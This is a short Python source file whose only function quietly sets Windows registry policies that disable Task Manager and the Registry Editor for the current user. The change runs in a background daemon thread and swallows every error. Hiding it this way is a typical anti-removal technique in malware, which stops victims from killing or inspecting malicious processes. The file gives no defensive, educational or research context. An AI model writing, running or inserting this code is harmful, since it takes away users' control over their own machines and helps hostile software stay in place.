import winreg, threading

def modify_registry():
 try:
  reg_key=winreg.HKEY_CURRENT_USER
  reg_path=r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
  key=winreg.CreateKey(reg_key,reg_path)
  winreg.SetValueEx(key,"DisableTaskMgr",0,winreg.REG_DWORD,1)
  winreg.SetValueEx(key,"DisableRegistryTools",0,winreg.REG_DWORD,1)
  winreg.CloseKey(key)
 except Exception:
  pass
def disableme():
 threading.Thread(target=modify_registry,daemon=True).start()